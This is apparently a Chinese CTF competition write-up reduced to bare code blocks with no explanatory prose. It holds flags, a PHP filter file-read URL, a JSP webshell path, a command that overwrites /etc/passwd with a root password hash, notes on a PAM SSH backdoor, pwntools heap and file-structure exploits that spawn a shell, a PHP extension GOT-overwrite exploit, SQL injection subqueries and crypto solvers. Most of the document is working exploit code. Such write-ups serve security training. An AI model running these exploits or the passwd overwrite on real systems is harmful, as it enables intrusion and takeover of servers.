# insertuser_flagcmd = f"insert into user_flag(username,flagname,flagvalue,note) values('{username}','{flagname}','{base64flagdata}','{notestr}')"# print(insertuser_flagcmd)

flag{e6f1573b9496a7f3-a85bcfc646ff161c71e520e7cba3}

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
flag1{9a0fe27c8bcc9aad51eda55e1b735eb5}flag2{5399019c4053e1a5e756522fe94cdefe}flag3{21db4fb5e7cd1d14f041436c4f50ce8c}flag4{efba34b4991857a0c3639a0a31424041}flag5{a40310f194e1abfec9581d026e29832c}flag6{bf2bbf3cf5bf7fa02fcfd1f649a03a78}flag7{cb8650fe07e6f4da7d9f1817b82eb019}flag8{912ec803b2ce49e4a541068d495ab570}flag9{ab67b0ec5c2d29c248e3aa9c7d31d620}flag12{76e24b847fdf0208195fffba98731234}flag14{8f552743a81f9bc517a35a5421e76764}
```



```
http://202.0.6.194:8080/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```



```
202.1.1.1202.1.1.129
```



```
password663399
```



```
pic.jpg
```



```
http://202.1.1.66:8080/api/upload
```



```
/usr/local/tomcat/webapps/ROOT/static/s74e7vwmzs21d5x6.jsp
```



```
bing_pass
```



```
pwd
```



```
tomcat
```



```
CentOS Linux release 7.4.1708 (Core)
```



```
/usr/local/tomcat/webapps/ROOT/static/secert.file
```



```
cat /etc/passwd
```



```
/etc/passwd
```



```
echo WLpoAWLex8nkqQ5WLpoAWLex8nkqQ5
cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpolkitd:x:999:998:User for polkitd:/:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologingeoclue:x:998:996:User for geoclue:/var/lib/geoclue:/sbin/nologinrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologincolord:x:997:995:User for colord:/var/lib/colord:/sbin/nologinpulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinchrony:x:996:992::/var/lib/chrony:/sbin/nologintomcat:x:1000:1000::/home/tomcat:/bin/bashecho -e "root:$6$KHysqjWMnoaHJ4QW$p1cMTekiYb/6xA2u7j4jAD3m5shTPlPAtM6jyoex73MxxHXlms4X0874ml/gw6.LETsMs5oXLWyGeSAddx2N..:0:0:root:/root:/bin/bashnbin:x:1:1:bin:/bin:/sbin/nologinndaemon:x:2:2:daemon:/sbin:/sbin/nologinnadm:x:3:4:adm:/var/adm:/sbin/nologinnlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinnsync:x:5:0:sync:/sbin:/bin/syncnshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownnhalt:x:7:0:halt:/sbin:/sbin/haltnmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnoperator:x:11:0:operator:/root:/sbin/nologinngames:x:12:100:games:/usr/games:/sbin/nologinnftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnnobody:x:99:99:Nobody:/:/sbin/nologinnavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinndbus:x:81:81:System message bus:/:/sbin/nologinnpolkitd:x:999:998:User for polkitd:/:/sbin/nologinntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinnpostfix:x:89:89::/var/spool/postfix:/sbin/nologinnsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinnsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologinngeoclue:x:998:996:User for geoclue:/var/lib/geoclue:/sbin/nologinnrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologinncolord:x:997:995:User for colord:/var/lib/colord:/sbin/nologinnpulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologinngdm:x:42:42::/var/lib/gdm:/sbin/nologinnchrony:x:996:992::/var/lib/chrony:/sbin/nologinntomcat:x:1000:1000::/home/tomcat:/bin/bashn" > /etc/passwdcat /etc/passwdroot:$6$KHysqjWMnoaHJ4QW$p1cMTekiYb/6xA2u7j4jAD3m5shTPlPAtM6jyoex73MxxHXlms4X0874ml/gw6.LETsMs5oXLWyGeSAddx2N..:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpolkitd:x:999:998:User for polkitd:/:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologingeoclue:x:998:996:User for geoclue:/var/lib/geoclue:/sbin/nologinrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologincolord:x:997:995:User for colord:/var/lib/colord:/sbin/nologinpulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinchrony:x:996:992::/var/lib/chrony:/sbin/nologintomcat:x:1000:1000::/home/tomcat:/bin/bash
```



```
123456
```



```
202.1.1.129:9999
```



```
rpm -qa | grep pam
```



```
pam_unix.so
```



```
ssh_back_pwd
```



```
/tmp/.sshlog
```



```
#include <iostream>#include "aes.hpp"int main() { unsigned char answer[]{ 0x1E, 0xF6, 0xB9, 0xF8, 0xB4, 0x94, 0x94, 0x34, 0x04, 0xFD,0xC9, 0xEF, 0x05, 0xAE, 0x85, 0xD9 }; answer[0] = 0xB4; answer[1] = 0x38; answer[2] = 0x36; answer[3] = 0x30; answer[4] = 0x1E; answer[5] = 0x68; answer[6] = 0x48; answer[7] = 0x57; answer[8] = 0x51; answer[9] = 0x01; answer[10] = 0xB7; answer[11] = 0x03; answer[12] = 0x9B; answer[13] = 0x98; answer[14] = 0xE3; answer[15] = 0x7E; AES_ctx ctx; unsigned char key[] = "gah43jJKgfjGMeAR"; AES_init_ctx(&ctx, key); AES_ECB_decrypt(&ctx, answer); for (int i = 0; i < 16; ++i) printf("%02X ", answer[i]); printf("n"); for (int i = 0; i < 16; ++i) printf("%c", answer[i]); printf("n");}
```



```
flag{Re_1ts_f0n}
```



```
struct list_struct{ unsigned __int8 data; list_struct *next;};
```



```
#include <iostream>#include <string>int ch2num(int ch){ return ch ^ 0x8D;}std::string final;//// aaa aaabchar record[0x100] = { 0 };int index = 0;bool done = false;void solve(int x, char ch){ // start from 1, can n * 2 or (n - 1) / 3, need to get x // 564 ab in total if (done)return; record[index++] = ch; if (x == 1) { for (int i = index; i > 0; --i) final.push_back(record[i]); final.push_back('-'); done = true; return; } if (x % 2 == 0) { solve(x / 2, 'a'); solve(x * 3 + 1, 'b'); } else { solve(x * 3 + 1, 'b'); } --index; }int main() { char answer[] = "ISCC2024"; int table[8]; for (int i = 0; i < 8; ++i) table[i] = ch2num(answer[i]) - (7 - i); for (int i = 0; i < 8; ++i) std::cout << table[i] << std::endl; for (int i = 7; i >= 0; --i) { std::memset(record, 0, sizeof(record)); index = 0; done = false; solve(table[i], 0); } final.pop_back(); std::cout << final << std::endl;}/*aaaabaaabaababaaababaaaababaababaaabaababaab-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaaaabababababa-aaaabaaabaababaaababaaaabaaabababaaababaabab-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaabaababababaa-aaaabaaabaababaaababaaaaba-aaaaaaaaaabababaab-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaabaabababababaababaaa-aaaabaaaaabababaaabaaaabaabaabaaaababababaaababababababaababaabababaaabaababababaabababaababaabaabababaaab
```



```
import subprocessdef test_opt(data): return subprocess.run( "/mnt/d/CTF_Exercise/2024ccbfinal/mapmap/mapmap_p", executable="/mnt/d/CTF_Exercise/2024ccbfinal/mapmap/mapmap_p", input=data.encode(), capture_output=True).stdoutdef is_wrong(output): if b'false' in output: return True else: return Falsedef get_enums(inp): if (len(inp) == 0): return ['w', 'a', 's', 'd'] last_c = inp[-1] if last_c == 'w': return ['w', 'a', 'd'] elif last_c == 'a': return ['w', 'a', 's'] elif last_c == 's': return ['a', 's', 'd'] elif last_c == 'd': return ['w', 's', 'd']ans = ''x=0y=0vis = []for i in range(39): vis.append([0] * 39)def check_ans(answ): x=0 y=0 for ch in answ: if ch == 'w': y=y-1 elif ch == 'a': x=x-1 elif ch == 's': y=y+1 elif ch == 'd': x=x+1 return (x, y)def dfs(depth): global vis global x global y global ans if depth == 140: if x == 38 and y == 38: print(ans) exit(1) return enums = get_enums(ans) for d in enums: nx = x ny = y if d == 'w': ny = ny - 1 elif d == 'a': nx = nx - 1 elif d == 's': ny = ny + 1 elif d == 'd': nx = nx + 1 if nx < 0 or nx > 38 or ny < 0 or ny > 38: continue if vis[nx][ny] == 1: continue ans += d outp = test_opt(ans) if is_wrong(outp) == False: oldx = x oldy = y vis[nx][ny] = 1 x = nx y = ny dfs(depth + 1) x = oldx y = oldy vis[nx][ny] = 0 ans = ans[:-1]vis[0][0] = 1dfs(0)
```



```
故flag为 flag{f205f28a97000b7a21a5df3f9264d796}
```



```
import hashlibpwd = 'e85000'for i1 in range(1,0x100): for i2 in range(0, 0x100): for i3 in range(0, 0x100): m = b'-%p-%p-%p-%p'+ bytes([i1,i2,i3]).replace(b'x00',b'') rel = hashlib.sha256(m).hexdigest() if rel[:6] == pwd: print(m,rel) input('>>')                exit(0)
```



```
from pwn import *import syss = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)rl = lambda :io.recvline()itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('202.0.5.76', 7777) elif args.AWD: # python3 exp.py AWD 1.1.1.1 PORT IP = str(sys.argv[1]) PORT = int(sys.argv[2]) return remote(IP,PORT) else: return process([binary] + argv, *a, **kw)

binary = './pwn'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''#brva 0x01DE1#brva 0x01F96b *_IO_wfile_seekoff#continue'''.format(**locals())

io = start(binary)

def login(pwd): ru('>> ') sl('2') ru('account : ') sl('QAQ') ru('password : ') sl(pwd)
def adjust(idx,size,text): ru('>> ') sl('2') ru('power: ') sl(str(idx)) ru('size: ') sl(str(size)) ru('staff: ') sl(text)
pwd = b'%p x19xe2'pwd = b'-%p-%p-%p-x8cxb5x08'pwd = b'-%p-%p-%p-%pxc0Rxb9'login(pwd)ru('-0x22-')libc_base = int(ru('xc0'),16) - 2016704 + 0x80#libc_base = int(ru('xc0'),16) - 0lss('libc_base')#exit(0)lss('libc_base')libc.address = libc_base
pay = flat({ 0x00: 0, 0x28: 0xffffffff, 0x30: 1, 0x70: b'/bin/sh', 0x90: libc.sym['system'], 0x98: libc.sym['_IO_2_1_stderr_']+0x70, 0xa0: libc.sym['_IO_2_1_stderr_'], 0xd8: libc.symbols['_IO_wfile_jumps'] + 0x30, # vtable # 可以控制虚表的走向 0xe0: 0}, filler=b"x00")
#gdb.attach(io,gdbscript)adjust(-2,0,pay[8:])ru('>> ')sl('4')sl(p64(0x31))itr()
```



```
./gdbserver :1234 php -S 0:8080
```



```
<?php
$heap_base = 0;$libc_base = 0;$libc = "";$mbase = "";
function u64($leak){ $leak = strrev($leak); $leak = bin2hex($leak); $leak = hexdec($leak); return $leak;}
function p64($addr){ $addr = dechex($addr); $addr = hex2bin($addr); $addr = strrev($addr); $addr = str_pad($addr, 8, "x00"); return $addr;}
function leakaddr($buffer){ global $libc, $mbase; $p = '/([0-9a-f]+)-[0-9a-f]+ .* /usr/lib/x86_64-linux-gnu/libc.so.6/'; $p1 = '/([0-9a-f]+)-[0-9a-f]+ .* /usr/local/lib/php/extensions/no-debug-non-zts-20230831/numberGame.so/'; preg_match_all($p, $buffer, $libc); preg_match_all($p1, $buffer, $mbase); return "";}

ob_start("leakaddr");include("/proc/self/maps");$buffer = ob_get_contents();ob_end_flush();leakaddr($buffer);

echo "n----1-----n";add_chunk(5,[0,0,0,0x80000000,0],"test1"); #需要构造好#add_chunk(1,[0],"/bin/sh;");add_chunk(1,[0],"/bin/sh");$rel = show_chunk(0); # vlun 会把数组控制的范围增大，然后 越界修改和泄露其他地方的值
$heap = $rel[7];$heap += ($rel[8] << 0x20);
$of = $heap - 72; # 数组起始#$str_got = hexdec($mbase[1][0])+ 0x4008;##echo "n----heap-----n";echo dechex($heap);echo "n----4-----n";echo $libc[1][0];echo "n----4-----n";#$offset = ($str_got - $of) / 4;$system = (hexdec($libc[1][0]) + 0x4c490);echo $offset;edit_chunk(0,$offset,$system & 0xffffffff); # 修改strlen_got表低四字节为 systemedit_name(1,'1'); # ?>
```



```
from Crypto.PublicKey import RSAimport libnumimport gmpy2# with open("private.pem", "rb") as f:# key = RSA.import_key(f.read())# print("n = %d" % key.n)# print("e = %d" % key.e)# print("d = %d" % key.d)# print("p = %d" % key.p)# print("q = %d" % key.q)

# strs = "MTTC3TBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQIVLQmLXnlUYkCAggAMAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBBCQKgOObf2BrhJ9tHvAb4oBIICgP3WaNdtO3oTAX1GjdqBL0f6HvFZ9q25EIOAah78rfhKNrJQP0uHHUnbIDKUZTSMwNZ7kNQAAnJPdjwhZVNbymCjUrVvqs0VD8GWncUlIIxrAkpsgqioABSKLoy280ubg2s1IV/sqbuuvN4ldPvnAvyrLLnNLgGyU86v2Q1ArFWfG4kgeZSpW06W6TwgeIZbjRSnLKFXx1VEhpZSCOadg/HOh8BfLbFlZiWgDiuTdVSzGq34fLV8jKYfUjhEffh/tCNhjU5E8M6ItqgXZYyjbBO2ujewBzV1JiBE0QvcavwT8JvV2IDQXBtQmBJZXH4Vqoo2n5YmUgUFDxoZSdAqOfh5kcgO0OgORhOrX/qNisaDfBMwGx2csywJBuSujzZ3ckV3Gv2ysMzRPKfyZ/v10zElsrKZHci2wDMZ4XYqNyvPDafWaxkSNXP64eYRS8J6WVgWycaPq0LkoJnuxtmOnlYlZ8cmY2zOf4WfyG7X+NhK6CllS0or2Y7fuqo80dmGTrg7cuVA1GguRMA6qZAOlbqu8zT53vGUOIHDRQFb8DUU5H6t+I3e0+0Qj8ZwgTtUMCx2/WLc0YAq18Al9okrtsxuYIQ815SSxXKOXZsX93hACLEFFkKOW7vNdBMJdVJnbPoaMotkDYtH/d8TYPrrtyOhPRa/Xl8BzA9J40Z3PE+5XaQfTC4Wx9GMb3y/Dv1lVXrAd9XvCPD8jr6tu+aQWpMAq0uLpF0kgyS/5FDfIpiEHMMuRQ+FBKS58HWVkX1yKNmXkljJRpwe53AHLuDgt+0LNhry+5ck2GFH7bkxU13WmotrtUtnSdIX7FZrQzbJmbwHiyMi7oGdKT7vxkr3aFY="# for i in range(0,len(strs),64):# print(strs[i:i+64])
# from Crypto.PublicKey import RSA## # 读取加密的私钥文件# file_in = open("private.pem", "rb")# encrypted_key = file_in.read()# file_in.close()## # 密码爆破函数# def passphrase_cracker():# # 读取密码字典文件# with open("pass.txt", "r",encoding="utf-8") as file:# passwords = file.readlines()## # 尝试每个密码# for password in passwords:# passphrase = password.strip()# try:# key = RSA.import_key(encrypted_key, passphrase=passphrase)# print(f"Passphrase cracked: {passphrase}")# print("n = %d" % key.n)# print("e = %d" % key.e)# print("d = %d" % key.d)# print("p = %d" % key.p)# print("q = %d" % key.q)# break # 如果找到正确的密码，停止循环# except ValueError:# continue### # 调用密码爆破函数# passphrase_cracker()
n = 136024092362152689710172713899392826085562613819502637163574709012959800908069097569347489959246188000879909455954675900898187256462694001680199507890264369748020986792003039927832146357618380320485640247974651461597017754521523478582789651823653650205470697891883134131193787384293246455773119816555908050877e = 65537d = 96983349311172448114610684077344531859866705158061854017461211652174689366790434748659538326833645524163686606777761277160529104669611099325734812475218305914063705028257975357368955813173682894994622796568980398528404622799756620123598161913849740935593865664141149764560174893499019267153779766584891066853p = 12048894621399454101058574170146672880023504304935502855438830209547540828334463319100866266089541071671086068945870668091434002554455832672446379382564831q = 11289342021513486663717934560260253958877903230700176094000844663541917077757746704211638621740652499799934180688739478331856827700031454191788549757111267
c = "MDgnetOpihRoTmbreC2P7EQqkmeHloAWQ0SA2gKuHWPUP3u8u81ewsTnlyhvc7qLMMpVl36M9Z0Hu++yIKt2C/mimOFH04ixQAUo5y8h8vajw7vRLwfhpxC+pSjWvxjP2ieWVgdmXraijq92K6vdXod/SVaOyBT/1/asqhq1abQ="
import base64
c = base64.b64decode(c.encode())c = libnum.s2n(c)
phi = (p-1)*(q-1)d = gmpy2.invert(e,phi)m = pow(c,d,n)print(libnum.n2s(int(m)))
```



```
flag{182w3t-he5dr4y8g-gy590-gggtd46nd-dgw3456utg676}
```



```
#include<stdio.h>void xtea_encryt(unsigned int rb, unsigned int *buf, int *key){ unsigned int v3; // [rsp+0h] [rbp-28h] unsigned int v4; // [rsp+4h] [rbp-24h] unsigned int v5; // [rsp+8h] [rbp-20h] unsigned int i; // [rsp+Ch] [rbp-1Ch]
 v4 = *buf; v5 = buf[1]; v3 = 0; for ( i = 0; i < rb; ++i ) { v4 += (key[v3 & 3] + v3) ^ (v5 + ((v5 >> 6) ^ (4 * v5))); v3 -= 1640951535; v5 += (key[(v3 >> 11) & 3] + v3) ^ (v4 + ((v4 >> 6) ^ (8 * v4))); } *buf = v4; buf[1] = v5;}
void xtea_decrypt(unsigned int rb, unsigned int *buf, int *key){ unsigned int v3; // [rsp+0h] [rbp-28h] unsigned int v4; // [rsp+4h] [rbp-24h] unsigned int v5; // [rsp+8h] [rbp-20h] unsigned int i; // [rsp+Ch] [rbp-1Ch]
 v4 = *buf; v5 = buf[1]; v3 = (0x100000000 - 1640951535) * rb; for ( i = 0; i < rb; ++i ) { v5 -= (key[(v3 >> 11) & 3] + v3) ^ (v4 + ((v4 >> 6) ^ (8 * v4))); v3 += 1640951535; v4 -= (key[v3 & 3] + v3) ^ (v5 + ((v5 >> 6) ^ (4 * v5))); } *buf = v4; buf[1] = v5;}

int main(){ int key[4]; key[0] = 0x1234; key[1] = 0x3A4D; key[2] = 0x5E6F; key[3] = 0xAA33; unsigned int tmp[2]; unsigned int flag[] = {0x8CCAF011, 0x835A03B8, 0x6DCC9BAD, 0xE671FA99, 0xE6011F35, 0xE5A56CC8, 0xD4847CFA, 0x5D8E0B8E}; for(int i=0;i<8;i+=2){ tmp[0] = flag[i]; tmp[1] = flag[i+1]; xtea_decrypt(33,tmp,key); flag[i] = tmp[0]; flag[i+1] = tmp[1]; } printf("%sn",&flag[0]);}
```



```
flag{xLi1SSQzRzYw3MfHOPeJkACm4m}
```



```
from pwn import *import syss = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)rl = lambda :io.recvline()itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)

#io = process('./Old_man_v1')#io = remote('202.0.5.60',9999)libc = ELF('./libc-2.27.so')def add(idx,size,text='A'): ru(' neededn') sl('1') ru('add?n') sl(str(idx)) ru('include?:n') sl(str(size)) ru('about:n') s(text)
def edit(idx,text): ru(' neededn') sl('3') ru('edit?n') sl(str(idx)) ru('about:n') s(text)def show(idx): ru(' neededn') sl('2') ru('show?n') sl(str(idx))def rm(idx): ru(' neededn') sl('4') ru('delete?n') sl(str(idx))

add(0,0x600)add(1,0x28)add(2,0x28)rm(0)show(0)libc_base = u64(r(8)) - 4111520system = libc_base + libc.sym['system']free_hook = libc_base + libc.sym['__free_hook']
rm(1)rm(2)
edit(2,p64(free_hook))
add(3,0x28,'/bin/sh;')add(4,0x28,p64(system))rm(3)
itr()
```



```
flag{c7e41125a9e433dd894dc1e427b61d82}
```



```
from pwn import *import syss = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)rl = lambda :io.recvline()itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('202.0.5.76',8888) elif args.AWD: # python3 exp.py AWD 1.1.1.1 PORT IP = str(sys.argv[1]) PORT = int(sys.argv[2]) return remote(IP,PORT) else: return process([binary] + argv, *a, **kw)

binary = './SandBoxShell'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''
#continue'''.format(**locals())
io = start(binary)
pay = asm(shellcraft.cat('/flag'))sl(pay) #gdb.attach(io,gdbscript)itr()
```



```
flag{b7a725b76dfef7aef18066b3a7c54df4}
```



```
flag{ea4c4090-a512-47ed-a817-8771e1640a63}
```



```
（SELECT COALESCE(passphrase,CHAR(32)) FROM secrets LIMIT 23,1）
```



```
（SELECT COALESCE(passphrase,CHAR(32)) FROM secrets LIMIT 18,1）
```



```
（SELECT COALESCE(flagvalue,CHAR(32)) FROM user_flag LIMIT 23,1）
```



```
（SELECT COALESCE(flagvalue,CHAR(32)) FROM user_flag LIMIT 18,1）
```



```
import pprintimport redata = {}with open("./2.txt","r") as f: for i in f.readlines(): try: res = i.split(" ")[15:16][0] res2 = res.strip().split(">") prex = res2[0] hz = res2[1] data[prex] = hz data.update(data) except: pass

# pprint.pprint(data)
for v in data.values(): num = int(re.findall(r"((.*?))",v)[0]) print(chr(num),end='') # print(num,"=",chr(num))
# dict1 = {'a': 1, 'b': 2}# dict2 = {'b': 3, 'c': 4}## dict1.update(dict2)# print(dict1) # 输出: {'a': 1, 'b': 3, 'c': 4}
解密脚本
import sqlite3import osimport randomimport base64from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import hashlib 
def md5_hash(input_rawstring): # 创建一个md5 hash对象 m = hashlib.md5() # 更新hash对象 m.update(input_rawstring) # 获取散列值的16进制字符串表示（32个字节长度） hexdigest = m.hexdigest() #将16进制字符串转换为16字节的字节串 byte_digest = bytes.fromhex(hexdigest) return byte_digest #return (hex_dig)
def genpassphrase(username,number): passphrase = "" accvalue = 0 # 这里省略了计算随机数种子的部分代码。其余代码都是okay的。
 random.seed(accvalue) total = random.randint(4,7) for i in range(total): str4bytes = base64.b64encode(os.urandom(3)) passphrase = passphrase + str4bytes.decode("utf-8") return passphrase

# 迭代次数，增加这个值会提高安全性，但也会降低性能 iterations = 10000 # 密钥长度（可以是16、24或32字节，对应AES-128、AES-192或AES-256） key_length = 16 # 简化版的PBKDF2实现，这里仅使用HMAC-SHA256作为伪随机函数 def pbkdf2(passphrase, salt, iterations, key_length): h = hashlib.sha256() u = passphrase.encode("utf-8") + salt for _ in range(iterations): h.update(u) u = h.digest() return h.digest()[:key_length] 

passphrase = "TJOC6+L+vTajLOGqfJMweoLFZqvJ"# AES加密用的salt从passphrase派生salt = md5_hash(passphrase.encode("utf-8") + b"saltseed")# 使用passphrase和salt通过PBKDF2派生密钥key = pbkdf2(passphrase, salt, iterations, key_length)# 初始化向量也从passphrase派生iv = md5_hash(passphrase.encode("utf-8") + b"IVseed") 
# 创建Cipher对象cipher = AES.new(key, AES.MODE_CBC, iv) 
# 需要加密的数据encrypted_flagdata_b64 = "PgH8ySWqsB1IJEradvOouNWEP5mpHZnu5e9ShkiS1LWLb81hRUjAZLD4zzzxO5Tn"
# 对数据进行填充，以符合AES的块大小（128位/16字节）# padded_flagdata = pad(original_flagdata, AES.block_size) 
# # 加密数据 # encrypted_flagdata = cipher.encrypt(padded_flagdata)
# 使用相同的salt和passphrase通过PBKDF2派生密钥 key_decrypt = pbkdf2(passphrase, salt, iterations, key_length) 
# 创建解密器对象 decipher = AES.new(key_decrypt, AES.MODE_CBC, iv) 
encrypted_flagdata = base64.b64decode(encrypted_flagdata_b64)
# 解密数据 decrypted_padded_data = decipher.decrypt(encrypted_flagdata) 
# 解密数据 
# 去除填充 decrypted_flagdata = unpad(decrypted_padded_data, AES.block_size)#decrypted_flagdatastr = decrypted_flagdata.decode("utf-8")# if original_flagdata == decrypted_flagdata:# print(f"rn congrutulations: {original_flagdata} matchs {decrypted_flagdata}rn") print(decrypted_flagdata)flagvalue = base64.b64encode(encrypted_flagdata)
base64flagdata = flagvalue.decode("utf-8")notestr = "encrypted with aes128. associated key, iv & salt are derived from passphrase."
# insertuser_flagcmd = f"insert into user_flag(username,flagname,flagvalue,note) values('{username}','{flagname}','{base64flagdata}','{notestr}')"# print(insertuser_flagcmd)
```



```
flag{e6f1573b9496a7f3-a85bcfc646ff161c71e520e7cba3}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/9-1716887889.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716887891.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716887892.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716887892.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/0-1716887893.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716887893.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/9-1716887894.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/2-1716887895.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/5-1716887896.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1716887897.png)